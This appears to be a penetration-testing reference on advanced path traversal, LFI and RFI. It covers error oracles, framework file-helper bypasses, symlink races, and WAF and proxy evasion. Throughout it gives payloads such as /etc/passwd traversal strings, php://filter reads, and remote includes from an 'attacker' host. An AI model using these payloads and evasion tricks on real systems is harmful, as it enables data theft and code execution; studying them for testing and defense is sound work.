**Content-length divergence** — the simplest oracle. A read that returns a real file will produce a response of different length than a read that returns an error, even if the visible body looks the same. Compare `Content-Length` (raw HTTP header) *and* transfer-encoded body length (for chunked responses). Divergence is a signal, not confirmation — some templates render "File not found: X" with the parameter reflected, producing length variance without a real read.

**Timing side channel** — reading a large file takes measurably longer than reading a small one or failing. Compare median request time (across many trials) for `?file=../../../../etc/passwd` vs `?file=../../../../nonexistent-file`. A significant divergence with the traversal target taking longer is a signal. Read a *very large* file (`/proc/kcore` — never actually reads, but a `stat` proxy; or `/var/log/some-huge-log`) and compare to a small file (`/etc/hostname`) for a wider timing gap.

**Boolean oracle from same-endpoint-shape** — if the endpoint returns different responses for "file exists" vs "file doesn't exist," even without content, that is a two-state oracle. Enumerate file existence: `?file=../../../etc/passwd` (exists) vs `?file=../../../etc/passwd-not-a-real-file` (does not). The response-shape delta scopes what files are on the box.

**Error-taxonomy fingerprint** — different failure modes produce different error shapes:
- Permission denied: `EACCES` — the file exists but the process can't read it (useful — proves the path is valid).
- File not found: `ENOENT` — the path doesn't resolve.
- Is-a-directory: `EISDIR` — the path exists and is a directory.
- Symlink loop: `ELOOP` — a symlink refers to itself.
- Bad file descriptor / stream open failed: framework-specific messages that leak the resolved path.

An app that maps different errno values to different HTTP responses (400 vs 404 vs 500) exposes a multi-state oracle even when it doesn't reflect content. Frameworks that render "Internal server error" with a stack trace including the resolved path leak the traversal target — the file bytes are absent but the path is confirmed.

**Out-of-band exfiltration via read that triggers a network call.** If the read sink follows scheme handlers, feed a URL that beacons on read:
- Java `URL`-based file loaders that follow `http:` — the fetch is the confirmation.
- PHP wrappers that follow `http://` (`allow_url_fopen`) — same.
- XML parsers with entity resolution — route to `xxe.md`, but the read-oracle shape is the same.

**Character-by-character extraction via error timing** (last resort, high-noise): construct a payload that reads a file and pipes the first byte into a conditional that either returns fast or slow — usually only available on evaluate-sink chains, not read-sink LFI. When it is available, the extraction rate is on the order of one byte per second per parallel request — feasible for short strings (a config key of 64 bytes), infeasible for large files.

**Per-stack error-taxonomy fingerprints:**

- **PHP** — `Warning: include(<path>): failed to open stream: No such file or directory in <caller>` (`ENOENT` reflected); `Warning: include(<path>): failed to open stream: Permission denied` (`EACCES`); `Warning: include(): Failed opening '<path>' for inclusion` (include-path exhaustion). All three leak the resolved path.
- **Python (Flask/Django)** — `FileNotFoundError: [Errno 2] No such file or directory: '<path>'` (Django DEBUG=True, Flask default when uncaught); `PermissionError: [Errno 13] Permission denied: '<path>'`; `IsADirectoryError: [Errno 21] Is a directory: '<path>'`. Django's DEBUG page renders the full traceback with the resolved path.
- **Node.js** — `Error: ENOENT: no such file or directory, open '<path>'`; `Error: EACCES: permission denied, open '<path>'`. Errors surfaced via Express's default error handler render as HTML with the message including the path.
- **Java** — `java.io.FileNotFoundException: <path> (No such file or directory)`; `java.nio.file.AccessDeniedException: <path>`. Spring Boot's `Whitelabel Error Page` renders the exception message.
- **.NET** — `System.IO.FileNotFoundException: Could not find file '<path>'`; `System.UnauthorizedAccessException: Access to the path '<path>' is denied`. ASP.NET's default error page renders the exception with `Message` field visible.
- **Go** — `open <path>: no such file or directory`; `open <path>: permission denied`. Errors surfaced via `net/http`'s default error handler render as plain text with the message.
- **Ruby (Rails)** — `Errno::ENOENT (No such file or directory @ rb_sysopen - <path>)`; `Errno::EACCES (Permission denied @ rb_sysopen - <path>)`. Rails' development error page renders the full backtrace.

The error class + errno pair fingerprints both the language and the specific failure mode. `ENOENT` at a path you expected means the traversal reached the file open but the file doesn't exist — try a variant path. `EACCES` at a path you expected means the file exists but the process can't read it — the primitive is confirmed, escalate the identity via another read (e.g., read `/proc/self/status` for UID). `EISDIR` means you hit a directory — request the file inside it.

## Write-Primitive Characterization

The base introduces the write-to-execution model. The advanced surface is characterizing the write axes in enough detail to pick the payload shape that survives the write pipeline.

**Content-control axes** (the write engine may transform your bytes between input and disk):
- **Encoding conversion** — the upload may transcode to UTF-8, strip BOMs, normalize line endings, or filter non-printables. Test with a payload that survives: a payload with only ASCII bytes usually survives; one with UTF-16 BOM or non-printable bytes may not.
- **Template rendering** — the app may render the input as a template before writing (evaluating `{{ }}` or `${}` on the way in). This is destructive for a raw-payload write; find a shape that survives (escape the template's delimiters, or supply raw bytes if the input path accepts binary).
- **Compression** — write engines that compress on ingestion (gzip, brotli) preserve the bytes but the on-disk file is compressed; a downstream read that expects gzip works, one that expects raw doesn't.
- **Image conversion** — an image uploader that re-encodes JPEGs strips ancillary metadata and may re-compress; a payload in EXIF is likely destroyed. A payload as raw pixel data in a lossless format (PNG) survives more often, but is still subject to color-space conversions.
- **Report generation** — the write is the *output* of a report engine (PDF, HTML, DOCX) — content is derived from templates + data, not raw input. Bypass via a data field that lands verbatim in the output (report metadata often echoes user input into the file), or via a template-injection surface (route to `ssti.md`).

**Path-control axes** (where the write lands):
- **Directory control** — the app may write to a user-scoped directory (per-tenant), a shared upload directory, or a system directory. Directory control is what turns a write into a useful primitive; without it, you write into a scratch location that no downstream reads.
- **Filename control** — full control (attacker-supplied filename, no sanitization) is best; partial (extension appended or replaced) constrains the payload shape; none (server-generated UUIDs) means the write only chains through a filename-agnostic downstream.
- **Absolute-vs-relative** — a write that accepts absolute paths bypasses the base-directory constraint entirely; extremely valuable when the write is chained from an upload with attacker-controlled filename.
- **Symlink policy** — does the write follow existing symlinks? If yes, an existing symlink at the target lets the write land elsewhere.

**Trigger-control axes** (when the write matters):
- **Immediate load** — the write is served next request (a template drop into `views/`).
- **Hot-reload** — the write triggers reload on file-change (frameworks with dev-mode watchers).
- **Cache invalidation** — the write invalidates a cache and the next request loads fresh (compiled-template caches).
- **Restart required** — the write is only picked up on service restart — rarely useful, unless you have a restart primitive.
- **User action** — a downstream user opens the file (viewing a "report" that renders your written template).
- **Scheduled task** — cron / systemd timer / Windows Task Scheduler picks up the write later.

**Combined characterization:**
| Axis | Full control | Partial | None |
|---|---|---|---|
| Directory | Directory + filename → write goes anywhere | Base directory + partial filename → constrained to base | Server-controlled → useful only for filename-agnostic downstream |
| Filename | Any shape | Extension appended/replaced | UUID/hash |
| Content | Raw bytes | Encoded/rendered | Derived (report output) |
| Trigger | Attacker-controlled | User-triggered | System-triggered |

A write with full control on all four axes reaches arbitrary code execution through the resolver chain (see base § File Write to Execution). Partial control constrains to specific chain expressions — a UUID-named write into a scanned templates directory still reaches template execution if the framework loads every file in the directory.

## Framework Static-File Handler Bypasses

Every framework ships a "safe" static-file helper. Safety is entirely a function of what the caller passed in — and every framework has known bypass patterns when the caller passed user input directly.

**Flask `send_from_directory(base, filename)`** — the current implementation calls `os.path.join(base, filename)` and then verifies the resolved path is inside `base` via `werkzeug.security.safe_join`. `safe_join` explicitly rejects absolute paths and paths whose join escapes the base. But: `send_file(joined_path)` — the sibling API — does **not** apply `safe_join`; a caller who wrote `send_file(os.path.join(base, user))` bypasses the containment check. Grep for `send_file(` calls where the argument is an `os.path.join` with user input; those are the vulnerable pattern. Historical CVE surface (older Werkzeug versions) had `safe_join` gaps on Windows separators — measure against modern Werkzeug.

**Express `res.sendFile(path.join(base, req.query.f))`** — Express `sendFile` accepts a `root` option that constrains: `res.sendFile(user, { root: base })`. Without `root`, an absolute path in `user` reaches anywhere the process can read. With `root`, Express validates the resolved path is inside `root` — but the pattern `res.sendFile(path.join(base, user))` (no `root` option) is the vulnerable one; the `path.join` collapses `../` and reaches arbitrary paths.

**Rails `send_file(path)` and `render :file`** — `send_file` accepts any absolute or relative path; there is no built-in containment. `params[:file]` reaching `send_file` directly is arbitrary read. Historical bypass: `render :file` (deprecated after Rails 5.1) was routinely used with user-supplied template names and became a traversal + RCE surface. Modern Rails apps still use `send_file` in downloads; check any download controller's argument.

**Spring `Resource` handling with `FileSystemResource`** — Spring's `WebMvcConfigurer.addResourceHandlers` combined with a `FileSystemResource` as the location, plus `RouterFunctions.resources` — is the exact shape of CVE-2024-38819 (see `path_traversal_lfi_rfi_novel_deep.md`). The dual-precondition AND gate applies: RouterFunctions must serve static resources AND the location must be a `FileSystemResource` (not `ClassPathResource`).

**ASP.NET Core `PhysicalFileProvider` and `Controller.File(path)`** — `PhysicalFileProvider(rootPath)` constrains reads to `rootPath` but requires the path to be a rooted subpath. A `Controller.File(userPath, mime)` call sends any file the process can read — no containment. `IFileProvider.GetFileInfo(userPath)` on a `PhysicalFileProvider` will reject absolute paths but not necessarily traversal — measure per .NET version.

**Go `http.ServeFile(w, r, filepath.Join(base, r.URL.Query().Get("f")))`** — `http.ServeFile` has a documented behavior that special-cases `..` inside its argument by rejecting requests that contain the literal `..` in the URL path (not the argument). But `ServeFile` uses `filepath.Clean` on its argument and follows the path as-is otherwise; a `filepath.Join(base, user)` where user contains `../` is escapes-capable (`filepath.Join` collapses `..` past the base). The `net/http.ServeMux` documented rule about redirecting requests containing `..` is a URL-level check, not a filesystem check.

**Tomcat `DefaultServlet` and rewrite valves** — see `path_traversal_lfi_rfi_novel_deep.md § Apache Tomcat Rewrite Valve — CVE-2025-55752` for the current class expression.

**Nginx `try_files` and `root` vs `alias`:**
- `location /X { root /Y; }` — the resolved path is `/Y/X/rest`. Nginx normalizes the URI before concatenation, so `/X/../../etc/passwd` becomes `/etc/passwd` before concatenation and Nginx rejects (400 Bad Request in most builds).
- `location /X { alias /Y/; }` — the resolved path is `/Y/rest` (the `/X` prefix is stripped). Traversal in `rest` is normalized before write; the `alias` off-by-slash class above is the specific bypass.
- `try_files $uri $uri/ /index.php$is_args$args` — the final fallback runs the framework handler; if the framework handler is vulnerable, `$uri` is passed as-is. This is not a traversal in Nginx; it's the framework's finding.

**Apache `AliasMatch` regex traps** — `AliasMatch ^/img/(.*)$ /var/www/img/$1` looks safe but the `$1` is the raw match; a request to `/img/../../etc/passwd` matches and expands to `/var/www/img/../../etc/passwd`. Apache does not re-normalize after AliasMatch expansion — this is a live class in current httpd 2.4.

**IIS URL Rewrite rules** — IIS URL Rewrite module rules using `{R:1}` or `{R:0}` substitutions can expand user input into paths; the substitution is raw string interpolation with no path normalization. Similar shape to `AliasMatch`.

## XSLT and XSL Template Path Traversal

XSLT is XML processed as code — `document()`, `xsl:include`, and `xsl:import` are file-reading primitives that traverse the same file layer as any other read. When a template is user-supplied or user-influenced, the class is direct.

**Primitives:**
- **`document('file:///etc/passwd')`** — reads the file into the transformed output; the content appears in the XSLT result.
- **`document(concat('file://', $userparam))`** — user parameter reaches `document` argument; direct traversal.
- **`xsl:include href="..."`** — reads and includes another XSLT file; if the href is user-controlled or has traversal, arbitrary XSLT is loaded.
- **`xsl:import href="..."`** — same as `xsl:include` for this purpose.

**Engine-specific extensions that escalate to RCE:**
- **Xalan-J / Saxon** — `xsl:script` element (deprecated but present in older builds) executes JavaScript or Java; combined with `xslt:extension` namespaces, arbitrary Java code runs during transform. CVE-2019-11358 (jQuery, unrelated) is a separate class — but the Xalan `<xsl:script language="javascript">` combined with `xalan://xalan.lib.sql.XConnection` extension has historically been an RCE surface. Route to `insecure_deserialization.md` for the modern JNDI-injection expression of Java-based XSLT RCE.
- **libxslt (Python `lxml`, PHP `XSL`)** — supports EXSLT extensions including `<sxsl:read-file>` in some builds; supports `saxon:evaluate` in some Saxon builds. These are the read/write primitives in the XSLT engine itself.
- **`.NET System.Xml.Xsl.XslCompiledTransform`** — the `XsltSettings.EnableScript = true` and `XmlResolver = new XmlUrlResolver()` combination enables `xsl:script` and external references; both off by default in modern .NET but frequently enabled in legacy code.

**Report engines are the common expression:**
- **JasperReports, BIRT, Crystal Reports** — accept XSLT-driven templates; user-supplied template names or XSLT fragments are the class.
- **FOP (Apache formatting objects)** — PDF generation from XSL-FO; user-supplied fragments can include `document(...)`.
- **Saxon-CE / Saxon-HE** — client and server-side XSLT engines.

**Confirmation:**
- OAST via `document('http://<oast>/x')` on an XSLT surface with network access — the OAST hit proves the engine dereferences external references.
- File read via `document('file:///etc/hostname')` with output reflected — the hostname string appears in the transform result.
- Combined with `xxe.md` — XSLT engines that back onto entity-resolving XML parsers inherit XXE surface. Load `xxe.md § XSLT Document` for the base pattern.

**Route:** XSLT-engine RCE and modern XSLT surface expansion (Saxon 2024–2026 advisories, if any) sit in `path_traversal_lfi_rfi_novel_deep.md § XSLT Engine RCE — Current Frontier` — advanced-file responsibility here is the read-primitive class and the report-engine catalog.

## Symlink Primitives and TOCTOU

A write-then-follow-symlink pattern is one of the oldest local-privilege-escalation classes; it applies to any process that (a) opens a path controlled by a lower-privileged user, (b) with a check-then-use gap between the check and the open. Web apps exhibit this in specific shapes:

**Symlink-in-uploads-directory:**
- Upload writes into `/var/uploads/<user-id>/`.
- A previous upload created a symlink at `/var/uploads/<user-id>/link` → `/etc/nginx/conf.d/`.
- A subsequent upload writes to `/var/uploads/<user-id>/link/backdoor.conf` — the write follows the symlink and lands in `/etc/nginx/conf.d/backdoor.conf`.
- Requires: an upload that creates symlinks (archive extraction with symlink support, or a direct-write API that accepts symlink types) plus a subsequent upload with a filename inside the symlink.

**Symlink-in-archive:**
- Zip-Slip's symlink variant — see `Archive Extraction` above.
- TAR-format symlink entries followed by write entries; extraction order matters (POSIX tar processes entries sequentially).

**Symlink through a shared temp directory:**
- Process A (attacker-controlled) writes `/tmp/foo` → `/etc/passwd`.
- Process B (privileged) reads or writes `/tmp/foo` as if it were a temp file — read discloses `/etc/passwd`, write overwrites `/etc/passwd`.
- Race conditions: `open(/tmp/foo, O_CREAT|O_EXCL)` mitigates the class; `mkstemp` mitigates the class; `fopen(/tmp/foo, "w")` does not — the file is created if missing, but if a symlink already exists at `/tmp/foo`, the write follows.

**TOCTOU in path checks:**
- Code path: `if (is_safe(path)) open(path)` — the `is_safe` check runs on the path, then the `open` runs. Between check and open, the attacker can swap the path (rename, symlink, or unlink+create-symlink). The check saw a safe path; the open opens a different path.
- Mitigation is `O_NOFOLLOW` on the open (rejects symlinks) or `openat(dirfd, name, O_NOFOLLOW)` with a directory descriptor. Both require code changes; grep for `open(` / `fopen(` calls that lack `O_NOFOLLOW` after a `stat`.
- Web-app expression: upload endpoint that (1) writes a temp file, (2) validates the temp file's content, (3) moves the temp file to its final location. Between (2) and (3), the attacker races to swap the temp file for a symlink; the move follows the symlink.

**Chained symlink primitives:**
- **Directory traversal + symlink drop + subsequent write** — traversal grants write to `/var/uploads/<victim>/`; drop a symlink there; wait for the victim's next upload (or trigger their upload via a phishing chain) to overwrite the symlink target.
- **Race on log rotation** — logrotate reads the log at path X, compresses to path X.1, and unlinks X. Between the read and unlink, a symlink at X.1 can be created to redirect the write. Feasible only with local process access.

**Windows equivalents:**
- Symbolic links (`mklink`) require SeCreateSymbolicLinkPrivilege — administrator or Developer Mode.
- Junctions (directory reparse points, `mklink /J`) do NOT require the privilege; any user can create a junction — this is the widely-exploited primitive. James Forshaw's research on `symboliclink-testing-tools` documents dozens of Windows-service TOCTOU vulnerabilities exploited via junction+ADS combinations.
- Hard links (`mklink /H`) do NOT require the privilege; but require the source to be on the same NTFS volume.

**Windows junction+ADS abuse pattern (Forshaw class):**
- The trick: junctions redirect directory operations but not file operations at the junction itself. If a privileged process opens `C:\some\dir\file`, a junction at `C:\some\dir` pointing to `C:\Windows\System32\config` makes the process open `C:\Windows\System32\config\file`. The privileged process's identity is used, not the junction creator's.
- Common expression: a Windows service creates or writes to a per-user directory that a normal user controls (e.g., `%LOCALAPPDATA%\Package\Cache\file`). The user replaces the target directory with a junction to a system directory; the service's write lands in the system directory as SYSTEM.
- Chained with an oplock (opportunistic lock): the user takes an oplock on a file the service will read, pauses the service on the read, swaps the file behind a junction, releases the oplock — the service's read now targets the swapped file.
- Web-app relevance: rare in remote-only exploitation, but any web app that spawns a system-user-owned process which writes to a user-influenced path is exposed.

**Object-manager symlinks (`\??\`, `\Sessions\`, `\GLOBAL??`):**
- Windows has an object-manager namespace that predates the NT filesystem paths. Object-manager symlinks are created with `CreateSymbolicLink` on the object namespace (or via NT-API `NtCreateSymbolicLinkObject`).
- Application-level path resolution eventually calls `NtOpenFile` with an object-namespace path; a redirection in the object namespace redirects the file open.
- Extremely rare from web apps, but present in local-privilege-escalation research; noted here for taxonomic completeness.

**Timing-window mitigation and its bypasses:**
- `O_CREAT|O_EXCL` on `open` prevents opening a symlink that already exists; the syscall fails if the file exists.
- `openat` with a directory descriptor is safer than `open` because the directory descriptor is resolved once and subsequent operations relative to it don't re-resolve.
- Neither eliminates all races: a directory descriptor to a race-vulnerable directory still races on subsequent renames of that directory.
- The general defensive pattern is to open the containing directory with `O_PATH`, then use `openat` on individual files within it — but this requires code changes throughout the file-handling code path.

## WAF and CDN Traversal Bypasses

WAFs and CDNs inspect a normalized URL before deciding whether to pass or block. Their normalization is not the same as the backend's, and every disagreement is a bypass class.

**Cloudflare** (documented behavior + observed patterns):
- Decodes `%2f` in path by default; can be disabled per rule.
- Rejects requests with obvious traversal characters (`../` in URL) at the WAF layer for OWASP CRS rules; encoded variants (`%2e%2e`) are decoded before inspection.
- Ruleset-specific: rulesets that target LFI patterns match on filesystem-path keywords (`etc/passwd`, `boot.ini`); bypass by fetching different high-value files or by fetching them via wrapper (`php://filter/convert.base64-encode/resource=...`).
- Path-normalization bypass: some CF configurations preserve `%2f` in the origin request; a backend that treats `%2f` differently than `/` may accept traversal that CF's own rules didn't inspect (because CF inspected the pre-decoded form).

**Akamai:**
- Kona Site Defender ruleset matches similar patterns to Cloudflare.
- Observed pattern: the `Akamai-Ghost` layer's URL parser handles bare CR differently (see HTTP Garden research; route to `http_request_smuggling.md`).
- Backend forwarding may or may not normalize; per-configuration.

**AWS WAF:**
- Rule-based; default managed rule set (AWS Core / AWS OWASP-10) matches obvious traversal patterns.
- URL-decode transformation available per rule; without it, an encoded payload passes because the rule's regex matches on the decoded form and the rule sees the encoded form.
- Path-based rules operate on the URI; body-based rules operate on the body; a payload split across URI and body (POST with the payload in the body) may bypass URI-only rules.

**Imperva Incapsula:**
- Signature-based with a proprietary ruleset; historical patterns include `../` normalization plus filesystem-keyword matching.
- Case-folding rules — mixed-case bypasses (`.%2e%2f`) sometimes succeed against strict-string matches.

**F5 BIG-IP ASM:**
- Signature + positive-security-model hybrid; strict URL parameter validation.
- Historically, `%%32%65` (double-encoded `.`) has bypassed some rule configurations.

**General bypass patterns for the CDN/WAF layer:**
- **Encoding stacking** — `%2e%2e%2f`, `%252e%252e%252f`, `%25%32%65%25%32%65%25%32%66`, and mixed-case combinations. Each layer of encoding requires the WAF to decode; if the WAF decodes N times and the backend decodes N+1, the extra decode is the bypass.
- **Case variation** — `..%2F` vs `..%2f`; some rules are case-sensitive on hex.
- **Split payloads across parameters** — `?a=../..&b=/etc/passwd` where the app concatenates `a` and `b`; the WAF inspects each param separately and neither triggers.
- **Chunked body delivery** — POST body split into small chunks; if the WAF caps inspection at N bytes, the traversal payload lands after the cap.
- **`Content-Type` bypass** — some WAFs skip body inspection for certain content types (`application/octet-stream`, `multipart/form-data` with a specific boundary shape); a body-based traversal payload sent with the skipping content type bypasses body rules.
- **Header injection carrying the payload** — payloads in `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`, `Referer`, `User-Agent` that the backend interprets as path — WAFs often don't inspect these headers with path rules.

**Confirmation protocol:** fingerprint the WAF layer first (server headers, error pages, `robots.txt` sometimes reveals CDN, specific block-page shapes for CF/Akamai/AWS/Imperva). Then test each bypass class in escalating order — a single successful bypass unlocks the class; do not stack encodings unnecessarily.

## Reverse-Proxy URL Character Handling — Beyond `/..;/`

The `/..;/` class is the headline architectural bypass; the reverse-proxy layer holds several more.

**Path-component character forwarding:**
- `%2f` in the path: some proxies decode and pass `/`, some pass the literal `%2f`, some reject with 400. Nginx pre-1.25 accepted encoded slashes in paths by default; Apache's `AllowEncodedSlashes` directive controls it; HAProxy passes literal; Envoy has `normalize_path` and `merge_slashes` policies.
- `%00` (null byte): most proxies reject or strip; some pass through to backends that then null-terminate strings (PHP, C-family backends).
- `#` (fragment): the fragment is client-side by RFC — it never leaves the browser. A proxy that receives `#` in a URL path is receiving a malformed request; behavior is inconsistent.
- CR/LF in path: some proxies pass encoded CR/LF (`%0d`/`%0a`) to backends that then split the line — related to header injection and request smuggling (route to `http_request_smuggling.md`).

**Proxy URL parser vs backend URL parser:**
- A proxy that normalizes `/foo/./bar/../baz` to `/foo/baz` before forwarding presents a canonical path to the ACL layer. A backend that receives the pre-normalized path uses `/foo/baz` — the two agree.
- A proxy that forwards the raw path leaves normalization to the backend. Backend URL parsers differ on `%2f`, on multiple slashes (`//`), on trailing dots, on RFC-3986 reserved characters — every disagreement is a bypass surface.

**Trailing-slash and case:**
- `/admin` vs `/admin/` — some routing frameworks treat these as the same route, some as different. When the proxy has an ACL on `/admin` but the backend accepts both, `/admin/` may reach the resource.
- Case sensitivity — HTTP paths are case-sensitive per RFC; some proxies and some backends case-fold; disagreement is a bypass surface. `/ADMIN` at the backend + case-fold to `/admin` at the ACL differ.

**Streaming-vs-buffered request bodies:**
- Some proxies (Nginx with `proxy_buffering off`) stream request bodies without inspection; a WAF that inspects request bodies for path payloads is bypassed if the WAF layer expects buffered bodies.
- Chunked-transfer encoding on the request: the proxy may or may not reassemble; the WAF may or may not see the assembled body.

**Confirmation for architectural class:**
- Identify the proxy (Server header, error page fingerprint, or an OPTIONS response).
- Identify the backend (framework version leaked in error responses, timing fingerprints).
- Consult vendor-specific behavior for each layer's URL parser (their documented normalization rules, if any).
- Fire the probe matrix (`../`, `%2f`, `%2e%2e`, `..;/`, `%3b/`, `/./`, `//`, `/foo/`, `/foo`, trailing dot, mixed case) — record which combinations succeed at reaching a resource the proxy's ACL would deny.

## RFI Deep — Fetch-and-Evaluate Sinks

RFI is the class where a sink both **fetches a URL** and **evaluates the returned bytes** as code — as opposed to fetching-and-reading (SSRF read) or fetching-and-inlining-as-content (SSRF with reflection). The evaluate step is what escalates disclosure to RCE.

**Language-specific RFI enablers (all-of-N per language):**

- **PHP `include`/`require` with `allow_url_include=On`** — the classical RFI: `include($_GET['file'])` where `$_GET['file']` is `http://attacker/x.php`. `allow_url_fopen=On` is required for the `http://` scheme to work at all; `allow_url_include=On` is additionally required to allow `include` on a URL. Both are `Off` by default in modern PHP (7.4+); RFI in modern PHP requires a target that explicitly turned them on. When both are Off, `php://filter` still works (see PHP Filter-Chain section) because `php://` is not a remote scheme; when both are On, direct `http://` RFI works and the class is trivial.
- **Node.js `require(user)`** — `require` resolves as a module path, not a URL. `require('http://...')` errors — Node's `require` does not fetch HTTP by default. But packages that register custom loader hooks (`Module._resolveLookupPaths` patches, `@babel/register`, `esbuild-register`) can add HTTP-fetching loaders — and a target with such a loader plus a user-controlled require string is RFI-capable. `import()` (dynamic ESM import) in Node 20+ accepts `data:` URLs (`import('data:text/javascript,console.log(1)')` executes); `data:` is not RFI-remote per se, but the code delivery is user-controlled.
- **Python `importlib.import_module(user)`, `exec(compile(fetched, ...))`, custom finders** — Python's import system supports registering finders on `sys.meta_path`. A target that registered an HTTP-fetching finder (`import urllib.request as u; class HttpFinder: ...`) and passes user input to `import_module` is RFI-capable. `exec(urllib.urlopen(user).read())` is direct fetch-and-evaluate; grep for `exec(` / `eval(` on any URL-returned data.
- **Java `URLClassLoader.newInstance([new URL(user)])`** — loads classes from a URL; the loaded class's static initializer runs on first reference. Combined with `Class.forName(className, true, loader)`, arbitrary Java code executes from a remote JAR. Historical example: many JMX/RMI paths trigger URLClassLoader with attacker-controlled URLs.
- **.NET `Assembly.LoadFrom(url)`** — loads a .NET assembly from a URL and can execute its code. `Assembly.LoadFile` accepts local paths only; `LoadFrom` accepts URLs on .NET Framework and (with restrictions) .NET Core.
- **Ruby `require(user)`** — Ruby's `require` accepts filesystem paths, not URLs directly. But `load(open(url).read)` is fetch-and-evaluate; older Ruby `Kernel#open` accepted URLs (documented; treated the string as a URL if it started with `http://`).
- **JavaScript in the browser via `eval`/`Function`** — `Function('return ' + fetchedCode)()` on returned bytes is fetch-and-evaluate; XSS-adjacent, route to `xss.md` for the browser-side class.

**Fetch-and-evaluate vs fetch-and-read — the confirmation distinction:**

- **Fetch-and-read** (disclosure only) — the sink returns the fetched bytes to the response body without evaluating. Oracle: OAST callback proves the fetch happened; response body proves the content is reflected.
- **Fetch-and-evaluate** (execution) — the sink evaluates the fetched bytes. Oracle: an evaluation-only side effect (a `system('id')` in the returned code fires a second OAST callback with the output; a mutation of a known variable observable in a subsequent request; an exception thrown from the evaluated code appearing in an error log).

The two are indistinguishable at the fetch layer — the first callback only proves the fetch. Only a downstream evaluation-derived signal distinguishes them.

**SSRF-to-RFI chain:**

1. SSRF surface confirmed on `?url=` — the app fetches the URL server-side.
2. The fetching library and the sink together determine RFI: (a) is the response evaluated? (b) is it merely inlined into the response? (c) is it discarded?
3. If evaluated (rare for SSRF-only sinks, common for SSRF-into-templating): the SSRF becomes RFI. Chain the URL to a payload-serving OAST endpoint.
4. If inlined into response but not evaluated (common for HTML/JSON pass-through): the SSRF is disclosure of the fetched content. Route to `ssrf.md` for the SSRF-native surface catalog.

**WAF bypass patterns specific to RFI:**

- WAF rules matching `http://` in URL parameters are common; encode as `%68%74%74%70:` or `HttP:` (case) or `\/\/attacker/x` (protocol-relative, if the fetcher accepts it).
- Rules matching known payload-serving domains (a blocklist of OAST providers like `.oast.fun`, `.burpcollaborator.net`, `.oastify.com`): host on a domain not in the list, or use a URL shortener that redirects to your payload.
- Rules matching `.php`/`.aspx`/`.jsp` at the URL path end: rename the payload file to `.txt`, `.html`, or no extension.
- Rules matching payload keywords (`<?php`, `system`, `eval`) inside the response body: encode the payload (base64 + eval, XOR + eval) so the wire bytes don't match.
- The rules applied to `Referer`, `X-Forwarded-For`, and other headers frequently differ from those on the URL — a URL param blocked as RFI may go unblocked if placed in a header the app reads.

**OAST-confirmation shape for RFI:**

- **DNS-only hit** — proves the URL parser resolved the hostname; may or may not prove fetch. Rare for a fetcher that doesn't fetch — most fetchers resolve DNS to fetch.
- **HTTP GET hit** — proves the fetch happened. Distinguishes fetch-and-read from no-fetch, but not fetch-and-read from fetch-and-evaluate.
- **HTTP GET hit + subsequent OAST hit from the evaluation** — the payload includes a second callback triggered only if evaluated. This is the confirmation for execution.
- **Response reflection** — the fetched content appears in the response body. Proves reflection but not evaluation — a `<script>alert(1)</script>` in the fetched content that fires only when rendered by a browser is XSS via SSRF-reflection, not RFI.

**Not a class:**

- A fetcher that fetches and inspects for a signature (e.g., "verify this file is a valid SPF record") but never executes: this is fetch-and-parse; a payload that parses as valid-shape may still succeed in mis-parsing, but is not RFI.
- A fetcher that fetches and hashes the content for a policy check: this is fetch-and-hash; the fetch is real but the payload never runs.
- A downloader that saves the fetched file to a path but never opens it: this is fetch-and-write; combined with a downstream loader, it can escalate to RFI, but standalone it is not.

## Server-Side URL Fetcher Path Extensions

When a URL-fetcher primitive is present (SSRF), traversal-related extensions unlock read primitives against local files without needing a filesystem sink at all:

- **`file://` scheme** — a fetcher that accepts `file://` reads local files. The fetch is a read, not an include — no code execution, only disclosure. But it *is* traversal-adjacent because the fetched URL's path component honors `..` per URL semantics; `file:///tmp/../etc/passwd` resolves the `..` at the file layer.
- **`file://` with a hostname component** — `file://attacker.com/etc/passwd` — some parsers ignore the hostname; some route through SMB (Windows) or NFS (Linux with `nfs://` client extensions).
- **PHP `php://` wrappers via SSRF** — `curl http://target/proxy?url=php://filter/convert.base64-encode/resource=/etc/passwd` if the fetcher is PHP with `allow_url_fopen`. Fetcher-side wrappers are as reachable as filesystem wrappers.
- **`gopher://` for byte-exact server-side requests** — a `gopher://127.0.0.1:22/...` fetches SSH banner; combined with SMTP/Redis/FCGI, the gopher scheme is a byte-exact TCP writer. Route to `ssrf.md` for the full catalog; the traversal-relevant primitive is `gopher://127.0.0.1:9000/_%01%01%00%08...` for FastCGI, which reads files through the FastCGI protocol.
- **Java `jar://` scheme** — `jar:file:///path/inner.jar!/inner-file` reads a file inside a JAR without unpacking. Combined with an SSRF that fetches `jar:http://attacker/j.jar!/x` in Java, the jar URL handler downloads the JAR then reads the internal file — the download is arbitrary code delivery if the reader treats internal files as classpath entries.

## Path-Fragment Injection in Non-URI Contexts

Traversal isn't confined to URI parameters. Every stored representation of a path — headers, JSON fields, log records, database columns, message-queue payloads — is a candidate injection surface if the downstream code treats the stored value as authoritative and passes it to a file operation.

**HTTP headers that reach file operations:**

- **`X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-URI`** — some frameworks (Symfony, some Spring configurations, IIS URL Rewrite) accept these headers as the effective URL, overriding the actual request line. Path traversal in the header lands as if it were in the URL. The classic 2018 IIS bypass used `X-Original-URL: /admin` to reach admin endpoints past a reverse-proxy ACL.
- **`X-Forwarded-Path`, `X-Forwarded-Prefix`** — Spring Boot and other stacks use these to reconstruct the "logical" path for redirect/link generation; a header with `../` may land in a static-file resolver.
- **`Referer`** — some log-parsing scripts extract the path from Referer and pass it to a file lookup (`grep <referer-path> access.log`); traversal in Referer lands as the grep target.
- **`User-Agent`** — extremely rare, but a log-analysis tool that treats UA as a hostname for reverse DNS or as a filename for cache lookup is exposed.
- **`Content-Disposition`** — a filename inside `Content-Disposition: attachment; filename="..."` on a upload lands in the storage-layer filename field.

**JSON fields:**

- **API endpoints accepting `path`, `filename`, `template`, `location`, `href`, `src`** in JSON bodies — the same principles as URL params, but often less guarded because JSON parsers unmarshal to structured objects and developers assume "JSON is safe."
- **Nested paths** — a JSON body `{"config": {"template": "../secret"}}` where the app deep-merges into a config object then reads `config.template` as a filename.
- **Prototype pollution** producing traversal — polluting `Object.prototype.template = "../../etc/passwd"` on a Node app that later reads `obj.template` from an unrelated object. Route to `prototype_pollution.md` for the pollution primitive.

**Database columns:**

- **Stored template paths** — a user-configurable template name column that the render engine loads by path.
- **Stored file paths** — an "attachment path" column that a download endpoint reads.
